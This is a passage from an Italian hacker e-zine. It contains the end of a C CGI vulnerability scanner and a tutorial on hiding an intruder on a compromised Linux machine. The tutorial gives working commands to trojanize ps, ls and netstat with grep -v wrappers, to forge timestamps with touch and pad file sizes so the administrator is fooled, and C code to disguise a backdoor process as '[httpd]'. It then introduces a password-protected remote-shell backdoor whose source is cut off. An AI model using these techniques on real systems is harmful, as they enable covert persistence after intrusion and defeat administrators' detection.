    if(strcmp("-i",argv[2])==0){info=1;}
    if((modo==0)&&(info==0)){
       porta=atoi(argv[2]);
    }
    if(argc>3){
      if(strcmp("-t",argv[3])==0){modo=1;}
      if(strcmp("-T",argv[3])==0){modo=2;}
      if(strcmp("-i",argv[3])==0){info=1;}
    }
    if(argc>4){
      if(strcmp("-t",argv[4])==0){modo=1;}
      if(strcmp("-T",argv[4])==0){modo=2;}
      if(strcmp("-i",argv[4])==0){info=1;}
    }
 }




 printf("\nM.H.G. CGI scanner \n\n");

 if ((he=gethostbyname(argv[1])) == NULL){
    herror("Non riesco a trovare l'host :( ");
    exit(0);
 }
 /* Se non trova l'indirizzo ip allora stampa un messaggio di errore
    scrive "Non riesco a trovare l'host" ed esce dal programma        */


 inizio=inet_addr(argv[1]);
 pos=ntohl(inizio);
 sock=socket(AF_INET, SOCK_STREAM, 0);
 bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
 sin.sin_family=AF_INET;
 sin.sin_port=htons(porta);


 if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0){
     perror("Non riesco a connettermi all'host :( ");
     exit(0);
 }
 /*Qui ha trovato l'indirizzo però magari la 80 è chiusa quindi non può
   connettersi -> altro msg di errore e uscita dal prog */

 /*Se invece è andato tutto bene come prima cosa guarda che tipo di demone
   gestisce il sito web */

 if(modo!=0){
   /*printf("\n\nPremere invio per vedere il tipo di server web \n");
   getchar(); */

   send(sock, "HEAD / HTTP/1.0\n\n",17,0);
   /*inviamo il comando per richiede info */

   recv(sock, buffer,sizeof(buffer),0);
   /*andiamo a vedere cosa ci ha risposto il server (contenuto di buffer) */

   printf("%s\n",buffer);
   /*Prendiamo il buffer=risposta del server e lo rovesciamo sullo schermo */

   close(sock);
   /*Chiudiamo temporaneamente il sock*/

   if (modo==2){
      exit(0);
   }

   printf("\nPremere INVIO per iniziare la ricerca dei cgi\n");
   getchar();
 }

 /* Ok cicliamo per tutti i cgi che abbiamo messo in buff */
 while(contatore++ < numerocgi){

     sock=socket(AF_INET, SOCK_STREAM, 0);
     bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
     sin.sin_family=AF_INET;
     sin.sin_port=htons(porta);

     if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0){
        perror("Non riesco a connettermi all'host :( ");
        exit(0);
     }

     printf("Vediamo se c'è %s ",nomecgi[contatore]);
     /*Volta per volta dice quello che sta cercando*/

     for(i=0;i < lungbuffer;i++){
        buffer[i] = '\0';
     }
     /*se non svuotassimo il buffer ci potrebbero essere problemi*/

     send(sock, buff[contatore],strlen(buff[contatore]),0);
     /*Inviamo la richiesta per il cgi numero "contatore" */

     recv(sock, buffer, sizeof(buffer),0);
     /* Andiamo a vedere cosa ci ha risposto */

     cgistr = strstr(buffer,msgtrovato);
     /*Guardiamo se nella risposta c'è un 200 OK che significa che il cgi c'è*/


    if(cgistr != NULL){
        printf(" siiii TROVATO :)    \n");
        if (info==1){
           printf("%s\n",hack[contatore]);
        }
     }
    else
        printf(" uhmmm no non c'è :( \n");

    /*Se c'è cgistr, come già detto, punta a qualcosa di diverso da NULL quindi
      possiamo scrivere un messaggio che ci informa che il cgi C'E' altrimenti
      un altro messaggio che ci dice che quel cgi non è nel server*/

    close(sock);
    /*chiudiamo il sock*/
 }

 printf("\n\n");
}

/*------------------------------ A QUI ----------------------------------*/ 


= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =

= *************************************************************************** =
= ============================ [ HACKING PRATICO ] ========================== =
= *************************************************************************** =

Autore: Il buon vecchio Zio Xab (il fu ][^XaBaRaS^][ )... naa lo sono ancora :D
Pensiero del Giorno: Ragazzi VOLTIAMO PAGINA
Canzone Ascoltata da 8 ore di fila: Turn The Page (Metallica - Garage Inc. )

Esatto! Mi rendo conto che fino ad ora ho fornito a Security System solamente
degli articoli che riguardano o spunti psichici (vedi LA PROVOCAZIONE e la
TELENOVELA PENSIERI), o articoli come quello del protocollo FTP, che a molti
potrebbe sembrare una cazzata (assicuro ai nuovi adepti dell'arte dei protocolli
di rete che non lo è); per tanto mi ripropongo di far apparire per ogni numero
di Security System almeno un articolo che tratti di hacking spicciolo: consigli
o programmi buttati lì, si proprio lì in mezzo, che possono essere raccattati
o da menti malvagie, o da menti aperte all'informazione.... spetta a voi
decidere cosa farci. Molti penseranno: articoli del genere sono scontati, si sa
che il loro contenuto sarà sfruttato ai fini di hackeraggio (che non incoraggio
minimamente). Invece vi sbagliate!! Se siete amministratori di sistema o se
state provando ad esserlo amministrando la vostra macchina, o nel caso aveste
una LAN le vostre macchine, allora noterete degli spunti interessanti da
leggere ed apprendere (della serie "Cazzo ogni tanto provate a capovolgere
questa fottuta medaglia a 2 facce!!). Contenuto qui non ci sarà niente di nuovo 
e niente di sacrosanto; a molti suoneranno di consigli già detti e ridetti, 
altri invece cominceranno a scorreggiare alla nocciola dopo aver mangiato un 
gelato, per le forti risate, ma questo vuole essere un articolo per coloro che 
1) si stanno affacciando da poco ad un sistema operativo diverso da Windows 
(vedi Linux :) e 2) non hanno mai programmato e pensano che C sia solamente una
lettera dell'alfabeto. Quindi inutile dire che i flame dovrebbero andare a
finire su /dev/null .... la consolle lasciatela libera a chi vorrebbe
domandarmi degli approfondimenti riguardo tale articolo.

Prima di cominciare credo sia giusto aggiungere dei crediti DOVEROSI. Quasi
tutti.... e RIPETO ... quasi tutti gli spunti di questo articolo sono stati
presi dai primi numeri di BFI (in particolare gli implicati sono l'1 ed il 2);
in parole povere, ogni qual volta salterà fuori del codice da commentare
verrà anche specificato a chi va il merito di averlo scritto (anche se come
dice FuSys queste sono cose già implementate da migliaia di altri coders
sulla terra, ma noi tutti lo sappiamo, lui è modesto :).

Se posso menzionare questa manciata di stringhe in C il merito è in
particolar modo suo, e credo che se l'articolo desterà l'interesse di altri
lettori saremo in 2 ad esserne felici.

                            [ PRIMI PASSI PLASMON ]

Sotto linux (ed inutile dire sotto tutte le macchine *Nix) dovrete avere a
che fare fin dal primo momento con una vita loggata e controllata.
In parole povere ciò che vi appare sotto Windows premendo
CTRL + ALT + CANC è la stessa lista dei processi (almeno concettualmente) che
sotto linux (da ora in poi intendiamo QUALSIASI MACCHINA *NIX) vengono messi
in bella vista al root ed agli utenti attraverso il comando "ps". Questo figlio
di puttana non fa altro che listare TUTTI i processi che sono attivi sulla
macchina, con possibilità di visualizzare quelli inerenti un particolare 
utente. Quando eseguite un file, tutte le informazioni su di esso
(del tipo chi l'ha eseguito, a che ora in che data, etc etc) sono 
riscontrabili attraverso la consultazione del ps. Esempio:

[xabino@xabino xabino]$ ./backdoor
(eseguiamo il file backdoor e . . .)

[xabino@xabino xabino]$ ps -aux |grep backdoor
(andiamo a controllare le informazioni visualizzate con il comando ps)

xabino     790  0.0  0.4  1080  296 tty2     S    13:53   0:00 ./backdoor

Allora vediamo di spiegare per sommi capi cosa abbiamo fatto e cosa significa
tale output. In primis abbiamo capito cosa fa il comando ps. Dopo il pipe
"|" (il cui scopo è ridirigere l'output di un comando come input di un altro)
facciamo la conoscenza di un altro comando ancora (il grep); questo è molto
utile perchè evitiamo di visualizzare tutto l'output del comando ps e quindi
in poche parole sta a significare "visualizza solamente le informazioni 
dei processi che si chiamano backdoor". Questo figlio di puttana del grep viene
spesso utilizzato assieme ad un'apposita opzione per cancellare log testuali
e potrebbe essere molto utile anche per aiutarci a nasconderci in una macchina
(e dopo vedremo come). L'output del ps ritornato ha le seguenti caratteristiche:
(notiamo solamente le più importanti)

1) la prima colonna indica l'utente che ha eseguito il file
2) la seconda colonna indica il PID del processo; questo non sarebbe altro
   che un identificativo numerico per distinguere un processo da un altro
   (in quanto possono esistere più processi con lo stesso nome, come nel
   caso di un file eseguito più volte da un utente o di un file eseguito
   più volte da utenti diversi). Il PID è il fulcro delle operazioni degli
   amministratori di rete, in quanto è attraverso questo che si può
   killare un processo indesiderato, quindi in parole povere una buona
   backdoor dovrebbe essere invisibile all'amministratore e quindi al ps; 
   ma dubito che non lo avevate ancora capito.
3) La terza e quarta colonna indicano rispettivamente la cpu e la memoria
   occupata dall'esecuzione del programma.
4) La settima colonna indica la consolle del terminale dalla quale è stato  
   fatto partire il comando (fate un "w" da dove avete eseguito il comando 
   e vedrete che il ttyX corrisponderà).
5) L'ottava colonna indica lo stato del processo. Da qui si può vedere
   se un processo è in esecuzione, quali sono i processi zombie etc..
   ("man ps" caso mai).
6) La nona colonna indica l'orario in cui è stato eseguito il file.
7) La decima colonna indica il nome del file. Basterà un semplice find al
   root per scoprire dove questo è localizzato nell'hard disk della macchina.

Da queste informazioni abbiamo ben capito che tale comando dovrebbe essere
troianizzato in modo da non mostrare ciò che non vogliamo (il termine
"celare" vi sembra per caso troppo dark?). Ma non è tutto. Non dovremo
solamente difenderci dal ps. Spesso infatti quando viene installata una
backdoor nel sistema, questa deve essere usufruibile da remoto in modo
da poterla riutilizzare quando si vuole. Ciò implica che debba essere aperta
una porta che una volta telnettata ci
restituisca o una shell interattiva oppure qualsiasi cosa noi desideriamo (la
fantasia non è mai troppa in questi casi). Il comando "netstat" visualizza tutti
gli stati della transazione e tutte le porte che sono aperte nel sistema, tutte
quelle cioè da cui possono arrivare delle connessioni, o da cui si è connessi
verso altri sistema. Nel caso dell'esecuzione del file precedente "backdoor",
questo apriva la porta 1812 (che identifica un servizio chiamato radius), ed
una volta telnettata da remoto ci permetteva di navigare dentro il sistema.
Eseguendo per esempio il comando:

[xabino@xabino tools]$ netstat -an | grep 1812
(specifichiamo l'opzione -a per visualizzare tutte le informazioni
inerenti il comando netstat, -n per dire di stampare le porte
in formato numerico anzichè nei nomi che identificano il servizio, tipo in
questo caso radius, ed usiamo il pipe con il grep 1812 per visualizzare
solamente tutti gli stati delle connessioni inerenti la porta 1812)

tcp        0      0    0.0.0.0:1812            0.0.0.0:*               LISTEN

dall'output notiamo che esiste una connessione tcp sulla porta 1812 del nostro
sistema in stato di LISTEN, vale a dire che sta attendendo che qualcuno si 
connetta ad essa. Se l'admin della macchina telnetta a quella porta scoprirà
il trucco e capirà che qualcuno l'ha bucato lasciando una backdoor.
Anche qui risulterebbe molto utile poter celare le informazioni indesiderate.

Spesso inoltre dopo aver bucato una macchina ci si pone il problema di dove
posizionare i nostri file nell'hard disk. Talvolta nasconderli nella cartella
dell'utente bucato (o di un utente qualsiasi) non corrisponde a buona cosa e
spesso, tramite l'ausilio del comando "ls", l'admin ci scoprirà (prima o poi
accadrà). Anche in questo caso sarebbe comodo poter troianizzare il comando
ls in modo da non fare mostrare le directory o i file che ci interessano.

Adesso sappiamo l'esistenza di 3 potenziali nemici che minano la nostra
privacy sul sistema :D 

Solitamente per troianizzare un comando si modifica il file sorgente in c che
lo riguarda, lo si ricompila e lo si riimmette nella posizione originaria. 
Fare questo non è sempre la migliore soluzione. Vuoi per la scomodità del metodo
(non sapete quante volte sbraiterete perchè avrete sbagliato versione di 
pacchetto sorgente o perchè per un motivo o per l'altro il programma non vuole 
compilarsi correttamente), vuoi per il tempo che si deve impiegare, a breve
termine potrebbe essere più economico (in termini appunto di tempo e di sballo)
utilizzare un altro approccio. Daccordo, sarete più sgamabili se il root
ha il vizio di controllare la dimensione dei file binari, ma tutto ha un prezzo,
quindi guardate il suo .bash_history per capire che abitudini è solito
esternare :D

Abbiamo detto che grep ci aiuta a visualizzare una sequenza di caratteri da
noi voluta, da grossi output . . . ma grep presenta anche un'opzione "-v" che
fa in modo che vengano visualizzate tutte le linee dell'output tranne
quella specificata. Nel caso del comando ps dell'inizio dell'articolo
possiamo notare la seguente situazione:

[xabino@xabino tools]$ ps -x |grep -v backdoor
(utilizziamo solamente l'opzione -x del ps in modo da visualizzare SOLO
i processi dell'utente xabino).

  PID TTY      STAT   TIME COMMAND
  707 tty1     S      0:00 -bash
  759 tty1     S      0:02 vi spicciolo1.txt
  760 tty2     S      0:00 -bash
  844 tty2     R      0:00 ps -x

In parole povere appaiono tutti i processi di xabino, tranne la backdoor che
lui stesso ha eseguito da linea di comando. Diciamo che questo grep -v ci fa un 
piacere non del tutto trascurabile. Se abbiamo i privilegi di root sulla 
macchina potremmo fare in modo che la parola backdoor non spunti tra i processi 
del ps e che la porta 1812 e la stringa radius che identifica il servizio non 
sia altrettanto visibile al root nel netstat.  Per prima cosa dobbiamo riuscire 
a trasformare il segno della shell da "$" a "#"; quando ci sarete 
riusciti beh sappiate che avete la macchina in pugno. Dopo di che scriverete

[xabino@xabino tools]# cd /bin

e sarete dentro la directory che contiene i 3 file nostri nemici di oggi (ps,
netstat e ls). Nel caso volessimo troianizzare il ps scriviamo:

[xabino@xabino /bin]# mv ps .mandrillo
(cambiamo il nome del file da ps a .mandrillo . . .)

adesso creiamo un file chiamato "ps" (insomma se siete sotto
windows imparate "ed" oppure dopo un "cat > ps" incollate con il copia e incolla
ciò che vi interessa; alla fine premete ctrl + c per terminare la scrittura
sul file). Il contenuto di tale file sarà:

./.mandrillo $1 $2 $3 $4 $5 | grep -v backdoor 

Dopo ciò scriviamo:

[xabino@xabino /bin]# chmod +x ps
(rendiamo eseguibile il file)

e quando scriveremo ps -aux non apparirà il processo "backdoor". Cosa abbiamo
fatto allora? Abbiamo cambiato il nome del file originario da ps a .mandrillo,
abbiamo creato un file testuale chiamato ps e gli abbiamo detto che quando
viene eseguito questo deve richiamare il vero ps (che adesso si chiama
.mandrillo) e che deve visualizzarci tutti i processi del comando tranne
"backdoor"; quindi abbiamo reso il file eseguibile con il comando chmod +x . 
Se oltre alla parola "backdoor" vorremmo renderne invisibile al ps 
un'altra, basterebbe inserire nel file di testo un altro "| grep -v tipoparola"
accanto al "grep -v backdoor" e così via per tutte le altre parole. Questo
metodo potrete utilizzarlo con il "netstat" come con "ls", anche se quest'ultimo
presenta un piccolo difetto. Vediamolo assieme:

[xabino@xabino /bin]# mv ls .mantra
(cambiamo il nome del file da ls a .mantra)

creiamo un file testuale contenente:

./.mantra $1 $2 $3 $4 $5 | grep -v .mantra | grep -v .mandrillo

rendiamo il file eseguibile con:
[xabino@xabino /bin]# chmod +x ls

e dalla directory /bin dove sta il comando ps troianizzato ed il comando ls
anch'esso troianizzato digitiamo:

[xabino@xabino /bin]# ls -al

vedremo tutti i file tranne .mantra e .mandrillo ; in poche parole siamo
riusciti a nasconderli agli occhi del root. Ma lo ls troianizzato in questo
modo presenta anche un inconveniente: poniamo il caso che il root voglia
vedere le informazioni del file /sbin/ifconfig, se sbaglia (per caso) a
digitarlo come nel modo seguente:

[xabino@xabino /bin]# ls -l /sbin/ifconfif

otterrà: ./.mantra: /sbin/ifconfif: File o directory inesistente

quando in realtà l'output normale per un file inesistente dovrebbe essere:

ls: /sbin/ifconfif: File o directory inesistente

In questo modo il root noterà qualcosa che non va.
In parole povere potrete troianizzare qualsiasi comando con la tecnica descritta
sopra, i problemi rimangono comunque molteplici:

1) il root potrebbe avere segnata la data di ogni file importante e se andrà
   a vedere con il comando "ls" le proprietà di un file potrebbe notare che
   misteriosamente questo è stato creato nell'odierno periodo. Il consiglio è
   quindi che ogni file che andate a modificare dovrebbe contenere le stesse
   informazioni dell'originale, vale a dire stessi permessi e stessa data.
   (Possibilmente anche la stessa dimensione :)
   Per quanto riguarda i permessi potrete giocare con il comando chmod, mentre
   per quanto riguarda la data potrete utilizzare il comando touch assieme
   all'opzione "-d". Inutile dire che esistono comandi come "man" che ci
   spiegano come utilizzarli. 

2) il root potrebbe notare che la dimensione dei file troianizzati sia
   diventata terribilmente piccola (da migliaia di byte dell'originale 
   binario a poche centinaia del troianizzato testuale). Questo problema
   potrebbe risolversi inserendo nel file di testo tante righe vuote fino ad 
   arrivare alle dimensioni originarie.

3) solitamente il root non fa un "cat nomefilebinario | more", ma se
   dovesse farlo con i file troianizzati sarete sgamati all'istante, dato
   che leggerebbe le istruzioni contenute nel file (che in realtà è testuale),
   ed entrerebbe in backup state in men che non si dica. In parole povere il
   compito che vi lascio sarebbe quello di trovare un modo per evitare che
   questo avvenga (non so fate richiamare il file rinominato originale da
   un programma compilato in c, in modo che questo appaia come binario,
   anzichè farlo richiamare da un file testuale a cui si è assegnata la
   proprietà esecutiva attraverso il comando chmod +x   ..... anche se questo
   ha comunque le sue limitazioni, insomma vedete un pò voi :P )

Se pensate che sia troppo difficile fare cose del genere vi avverto che con
la vostra versione di Linux avreste anche potuto installare le man page
in italiano, quindi gli help di molti comandi potreste anche leggerli nella
madre lingua senza dovervi mettere a tradurre (e cazzo però!! Quando volete
impararlo l'inglese??).

      		   [ COMINCIAMO A FARE QUALCOSA DI SERIO ]

Ok il trucchetto che ho spiegato poc'anzi è per ritardati mentali, vale a dire
che CHIUNQUE lo conosce.... spesso anche il root. Talvolta però riusciamo ad
ottenere accesso ad una macchina (vuoi perchè sgamiamo le password di un
utente, vuoi perchè esistono condivisioni di rete su macchine Windows che
hanno account del ws_ftp con password craccabili inerenti un dato sistema
Linux ecc...) comunque ciò non vuol dire che se stiamo dentro siamo ROOT! 
Potremmo aver tentato in tutti i modi ... ma il cancelletto del root non siamo
riusciti ancora ad odorarlo ad un palmo di naso come con altre shell.
Daccordo... inutile dire che sarebbe meglio limitare gli accessi su quella
macchina, però potremmo anche sfruttarne le risorse così, con 
l'uid e il gid di merda che ci ritroviamo (ricordatevi che gli scanner non
hanno bisogno di essere eseguiti da root :D) .... oppure potremmo installare
una backdoor in modo che se anche il root scopre che noi usiamo l'account
di un suo utente, pur cambiando la password possiamo rientrare da un'altra
parte. Certo non essendo ancora uid 0 gid 0 non possiamo mica aspettarci
che la backdoor una volta utilizzata ci ritorni i privilegi del superuser...
insomma ragazzi, certe cose le do per scontate :D

La backdoor in questione potrebbe fare la seguente cosa: si mantiene attiva
sulla porta tcp 1812... una volta telnettata questa ci restituirà una shell
remota. L'unica differenza in confronto a quello che abbiamo detto prima è che
stavolta dovremo solamente avere il problema del netstat da tenere a bada ma non
del ps. Perchè vi domanderete voi? Perchè esiste un metodo che permette di far 
apparire tra i processi del ps un file binario chiamato "questaèunabackdoor" in
"quellochecazzovuoi", il tutto senza avere i privilegi di root, semplicemente
allegando prima di ogni programma le poche righe di codice sorgente che
tra poco commenteremo ed implementeremo. 

                                 [ LET'S GO ]

Partiamo un pò dalle basi che ci introdurranno alla comprensione del codice
che tra poco comtempleremo :D 

Poniamo il caso di avere un file eseguibile chiamato "inviamessaggio" la cui
fattispecie per l'utilizzo sia un qualcosa del genere:

[xabino@xabino /bin]$ ./inviamessaggio xabino.xabaras.net haxxor.xabaras.net

Beh appurato che l'utilizzo fittizio di tale file dovrebbe essere quello
di inviare un messaggio da xabino.xabaras.net a haxxor.xabaras.net
(e ciò implica naturalmente che i 2 host abbiamo quantomeno un demone 
apposito per fare ciò, non so se i messaggi popup mandati attraverso
Windows possano rendervi l'idea) adesso dobbiamo familiarizzare con 2
elementi importanti della programazzione : argc ed argv.

Gli argc in questo caso sono 3, cioè:

	1 ./inviamessaggio
	2 xabino.xabaras.net
	3 haxxor.xabaras.net

Solitamente quando effettuate un collegamento ftp verso un host, senza
specificare nessuna opzione, gli argc sono 2 (cioè ftp e nomehost). Gli
argc non sarebbero altro che il numero di stringhe o caratteri separati
da uno spazio, presenti su tutta la linea di comando prima di premere
INVIO. Spero di aver saputo rendere l'idea. 

Gli argv nell'esempio precedente sono anche 3 e corrispondono 
rispettivamente:

	./inviamessaggio           = argv[0]
      xabino.xabaras.net         = argv[1]
      haxxor.xabaras.net	   = argv[2]

se dopo haxxor.xabaras.net, separato da spazio vi fosse stato un altro
carattere od un'altra stringa quella sarebbe stata identificata da
argv[3]. Per esempio per identificare la quinta lettera di argv[1] (cioè
la "n") in c dovremmo scrivere qualcosa del tipo: argv[1][5]. Se non avete
mai avuto a che fare con le matrici prima d'ora, beh rimproverate i
vostri prof di mate, non me. In parole semplici, molto semplici, l'argc
identifica il numero degli argomenti della linea di comando, mentre argv
identifica i caratteri che formano un dato argomento. Inutile dire che
per argomento intendiamo una stringa di caratteri o un carattere soltanto
separato da uno spazio dalle altre stringhe o dagli altri caratteri. Se 
osserviamo la dichiarazione del "main" di molti programmi in c vedremo che 
vi sarà sempre un qualcosa del genere:

main(int argc, char **argv)

Ciò specifica che argc è un intero mentre argv è un puntatore di
caratteri. Appurato ciò credo che abbiate le basi fondamentali per capire
il codice che tra poco commenteremo (codice scritto ed implementato da
FuSyS su bfi2 e rispolverato da zio Xab in persona :D)

Quest'oggi noi dovremmo riuscire a codare un qualcosa che per funzionare
non ha bisogno solamente di essere eseguito come tutti i programmi
normali sotto linux, ma ha bisogno anche di un parametro specificato
sulla linea di comando che vada a sostituire nel ps il vero nome del
file che altrimenti apparirebbe tra i processi. La fattispecie della
linea di comando dovrebbe essere un qualcosa del genere:

./backdoor [httpd]

dove "./backdoor" è il nome del file che contiene la nostra backdoor
mentre "[httpd]" è ciò che apparirà nella lista dei processi del comando 
ps. Ripeto ciò è fattibile senza bisogno di avere i privilegi di root. 
Possiamo quindi notare che l'argc del nostro programma equivale a 2 ed 
anche gli argv sono 2, cioè argv[0] = "./backdoor" e argv[1] = "[httpd]. 
Prima di visionare tutto il programma, vedremo solamente le stringhe di 
codice principali che ci interessano per fare quanto descritto sopra. 
Naturalmente le analizzeremo a blocchi, non tutte in una volta.
Bene iniziamo. Mi scuso fin da subito se la comprensione del codice non
sarà immediata, ma perseverate fino alla fine e vedrete che qualcosa
riuscirete a tirar fuori.

Le dichiarazioni principali delle strutture e delle variabili sono:

	int i, j, argvlen;
	char *bfiargv[argc+1];
	char *fintops;

Ok allora, abbiamo 3 variabili numeriche i, j e argvlen di tipo intero, e
poi abbiamo 2 variabili di puntatori di caratteri che sono fintops e
bfiargv[argc+1]; per quest'ultimo sappiamo che il risultato dei suoi
elementi equivarrà a 3, in quanto l'argc della linea di comando è
uguale a 2 (cioè ./backdoor [httpd]) più 1.

	for(i=0; i < argc; i++) {
	   bfiargv[i] = malloc(strlen(argv[i]) + 1);
	   strncpy(bfiargv[i], argv[i], strlen(argv[i]) + 1);
      }

Qui abbiamo un ciclo for che va da i=0 fino ad i < 2 (in quanto l'argc è
2), quindi tale ciclo verrà eseguito per ben due volte (per i = 0 e per
i = 1). 

Nel caso di i = 0 avremo la seguente situazione:

	bfiargv[0] = malloc(strlen(argv[0]) + 1);
      
      ( malloc non fa altro che allocare in memoria la
        dimensione in byte della stringa argv[0] + 1. La dimensione della
        stringa viene calcolata dal comando strlen. Questa, sapendo che
 	  argv[0] è uguale a "./backdoor" sarà di 10 caratteri + 1 (quindi di
        11 byte). Bisogna ricordarsi che ogni carattere inputato equivale 
        ad 1 byte, e basta contare quelli di argv[0] + 1 per sapere di quanto
        sarà la struttura allocata in memoria
      )

	strncpy(bfiargv[0], argv[0], strlen(argv[0]) + 1);

      ( strncpy viene usato per copiare sulla variabile allocata in
        memoria bfiargv[0] (che abbiamo visto essere di 11 byte), 
        il contenuto di argv[0] (che equivale sempre a "./backdoor")
        fino alla sua lunghezza più 1 (vale a dire 10 byte + 1 = 11).
      )

Nel caso di i = 1 accade la stessa cosa che per i = 0, con l'unica
differenza che gli argomenti non saranno bfiargv[0] e argv[0], 
bensì bfiargv[1] (di 8 byte) e argv[1].

Quando i è uguale 2 il programma si accorge che i comandi del ciclo dovevano
essere ripetuti fino a i < 2, quindi esce per eseguire altre istruzioni.

	bfiargv[argc] = NULL;
	argvlen = strlen(argv[0]);

Qui notiamo che bfiargv[2] viene settato a NULL, dato che esso è stato
dichiarato precedentemente nella parte dichiarativa delle variabili, ma
non deve essere utilizzato per nessuna funzione vitale al programma. 
Vediamo inoltre che la variabile intera "argvlen" viene uguagliata alla
lunghezza della stringa argv[0], vale a dire 10.

	if (argvlen < strlen(bfiargv[1])) {
	   printf("Se vuoi fregare davvero ps vedi di lanciarmi almeno come
                 superFunKyTrUnKy ! \n") ;
	   abort();
	}

Qui bisogna dire che ho modificato leggermente il codice di FuSyS per quanto
riguarda l'argomento preso da strlen e per quanto riguarda la stringa contenuta
nel printf. Cosa succede? Sappiamo che argvlen equivale a 10, mentre la
lunghezza della stringa bfiargv[1] nel nostro caso equivale a 8 (cioè [httpd]+1)
quindi:

	se 10 < 8 allora vengono eseguite le istruzioni printf ed abort.

In questo caso non succede questo, ma proviamo ad immaginare per esempio che
la lunghezza della stringa bfiargv[1] sia di 14 caratteri, in tal caso
verrebbe scritto sulla nostra consolle il messaggio "Se vuoi fregare davvero
ps vedi di lanciarmi almeno come superFunKyTrUnKy !", dopodichè arrivati ad
abort() il programma verrebbe interrotto; perchè?. FuSyS stesso ammette che il
suo codice ha una deficienza, vale a dire che il nome che vogliamo far
apparire nel ps non deve essere di molto più lungo di come abbiamo chiamato
il nostro programma. Vale a dire che se invece di backdoor avessimo
chiamato il file "bk" non avremmo potuto far apparire nel ps il processo
come "[httpd]". Lo so è un pò una limitazione perchè a molti potrà sembrare
che un nome di file troppo lungo sia troppo vistoso e sgamabile dal root.
Vedremo più in là come poter chiamare questo file diversamente da "backdoor", 
che è molto più sgamabile di "tihofottutobastardoadmin".

	fintops=bfiargv[1];
	strncpy(argv[0], fintops, strlen(fintops));

Niente di particolare qui. Diciamo che fintops è uguale a "[httpd]", e poi 
copiamo dentro argv[0] il contenuto di fintops fino alla sua lunghezza
totale (che è di 8 byte).

	for (i = strlen(fintops); i < argvlen; i++)
		argv[0][i] = '\0';

Questo ciclo va da i = alla lunghezza della stringa fintops (cioè 8) fino ad
i minore di 10; ma cosa accade?? Esaminiamo il tutto passo passo. Dobbiamo
però premettere che argv[0] inizialmente era di 10 caratteri (vale a
dire "./backdoor"), mentre quando gli abbiamo copiato dentro il contenuto
della variabile "fintops" questa non riempiva tutto l'argomento (essendo
di solamente 8 caratteri); 2 caratteri restano vuoti. Con questo ciclo
invece eguagliamo tutti quei caratteri che sono vuoti al valore NULL
(identificato in c da '\0'), in modo che il processo nel ps appaia come 
"[httpd]" anzichè "[httpd]  ".

Per i = 8
	l'ottavo carattere di argv[0] (che ora non è più "./backdoor" bensì
	"[httpd]") viene settato a NULL.
Per i = 9
	il nono carattere di argv[0] viene settato anche a NULL.

Quando i è uguale a 10 il ciclo si accorge che 10 non è minore di 10, 
quindi esce per eseguire altre istruzioni. In questo modo l'argv[0] 
effettivo risulterà essere di 7 caratteri (dato che l'8 ed il 9 
sono stati settati a NULL). Ma non è finita, abbiamo ancora altri 2 
cicli.

	for ( i=1; i < argc; i++) {
	   argvlen = strlen(argv[i]);

per i = 1 fino ad i minore di 2 , la variabile numerica argvlen viene 
eguagliata alla lunghezza dei caratteri della stringa argv[1] (che 
sarebbe anche "[httpd]" e quindi di 7 caratteri); argv[2] non viene 
interpellato poichè per i=2 tale numero non è minore di se stesso.

  	   for ( j=0; j <= argvlen; j++)
	   argv[i][j] = '\0';
	}

questo ciclo viene eseguito da j=0 fino a j minore e uguale di 7. Tale
ciclo viene messo internamente al for precedente, e non fa altro che
azzerare argv[1] di [j] caratteri, quindi di azzerare tutti e 7
i caratteri di argv[1], dato che j va da 0 a 7 compreso (vedere quel
"<=" che dovrebbe rendere l'idea :)

Ok queste sono le righe di codice che possono essere inserite in
qualsiasi sorgente. A questo punto vi domanderete: ma dove vanno
inserite? Bene, solitamente non dovrete preoccuparvi solo di questo
(infatti andranno messe sempre subito dopo l'inizio del main program),
bensì dovrete anche modificare alcune cose a manella. Poniamo il
caso di avere un programma fatto da noi che si connette ad un server
telnet sulla porta standard (quindi questa non viene inserita sulla
linea di comando); la fattispecie per ciò sarà un qualcosa del genere:

./nomenostroprogramma host.a.cui.telnettarsi

Se volessimo inserire le nostre righe di codice sul main ci aspetteremmo
che il comando ed i parametri specificati siano:

./nomenostroprogramma host.a.cui.telnettarsi fintops

Bene... a cosa si deve stare attenti? Per prima cosa dentro il vostro
prog vi sarà un'istruzione if all'incirca come questa:

if ( argc < 2 ) {
   printf("Usa: %s host.a.cui.telnettarsi\n",argv[0]);

Naturalmente ciò andrà modificato in questo modo:

if ( argc < 3) {
   printf("Usa: %s host.a.cui.telnettarsi fintops\n",argv[0]);

In secondo luogo è sempre meglio (prima di implementare il tutto), leggere
il codice e vedere se deve essere modificato qualche ciclo o se
possono esserci inconvenienti nell'implementazione. Per esempio, nel
nostro caso l'argv che specifica i caratteri di cui è formato il fintops
è l'argv[2] e non l'argv[1] (come nel caso precedente), quindi quando
eguaglierete le strutture bfiargv ad argv (vedi righe di codice precedenti),
arrivati a:

fintops = bfiargv[1];

dovrete modificare il tutto a:

fintops = bfiargv[2];

Beh il codice è molto semplice da capire, cmq date sempre un'occhiata un
pò a tutto. Inoltre FuSyS aveva inserito in questo codice alcune chicche
che ho preferito togliere per farvi sbattere il grugno un pochino. Per
esempio, una di queste era quella che se non specificavate da linea di 
comando il fintops (e quindi lasciavate come nel caso nostro 

if ( argc < 2 ) etc etc

ne veniva copiato nell'argv[0] uno di default (specificato dentro il 
programma stesso da una costante denominata CIAO_PS). In poche parole 
andatevi a vedere il codice di FuSyS in bfi2 se vi interessa tutto questo.

		[ UNA BACKDOOR CLASSICA... FORSE TROPPO :D ]

Ok ragazzi, il codice che tra poco vi allegherò presenta le righe da noi
prima commentate, ed altre rintracciabili sempre sul num. 2 di BFI (su un
articolo scritto da DrumFire) che non spiegherò per motivi di spazio. 
Aspettatevi comunque nei prossimi numeri di Security System del codice ben 
illustrato (spero di esserne alla altezza) che riguarderà la programmazione 
dei socket. Volevo inoltre sottolineare che ho leggermente modificato il 
programma inserendovi un supporto molto semplice per le password. In questo 
modo se il root telnetterà alla porta 1812 non gli verrà immediatamente 
restituita la shell remota, bensì gli apparirà il prompt "Password:"

Credo che in questo modo saremo meno sgamati :P

--------------------------------------------------------------------------
Begin Here                                 BeKKoBacK.c
--------------------------------------------------------------------------
#include <stdio.h>
#include <signal.h>
